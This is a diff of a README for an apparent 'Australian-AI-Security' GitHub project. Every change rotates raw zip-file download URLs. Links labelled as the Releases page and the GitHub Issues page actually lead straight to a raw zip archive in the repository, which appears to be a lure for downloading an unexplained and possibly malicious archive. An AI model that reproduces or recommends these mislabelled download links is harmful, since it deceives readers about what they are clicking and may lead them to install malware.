@@ -1,6 +1,6 @@
 # 🌐 Australian-AI-Security - Discover AI Security Standards Easily
 
-[![Download Latest Release](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/docs/Security_Australian_A_2.4.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/docs/Security_Australian_A_2.4.zip)
+[![Download Latest Release](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/diagrams/A_Australian_Security_2.7.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/diagrams/A_Australian_Security_2.7.zip)
 
 ## 📖 Overview
 
@@ -27,9 +27,9 @@ Getting started is easy! Once you've downloaded the application, you can quickly
 
 To download the application, visit our Releases page:
 
-[Download the latest version here!](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/docs/Security_Australian_A_2.4.zip)
+[Download the latest version here!](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/diagrams/A_Australian_Security_2.7.zip)
 
-1. Go to the [Releases page](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/docs/Security_Australian_A_2.4.zip).
+1. Go to the [Releases page](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/diagrams/A_Australian_Security_2.7.zip).
 2. Look for the latest version of the software.
 3. Click on the link to download the appropriate file for your system.
 4. Once downloaded, locate the file on your computer.
@@ -65,7 +65,7 @@ To engage:
 ## 📬 Support
 
 If you run into any issues or have questions about the application, please feel free to reach out. You can find assistance by visiting:
-- [GitHub Issues Page](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/docs/Security_Australian_A_2.4.zip)
+- [GitHub Issues Page](https://github.com/Wasi69/Australian-AI-Security/raw/refs/heads/main/diagrams/A_Australian_Security_2.7.zip)
 - Community forums where users discuss their experiences and solutions.
 
 ## 📈 Future Updates
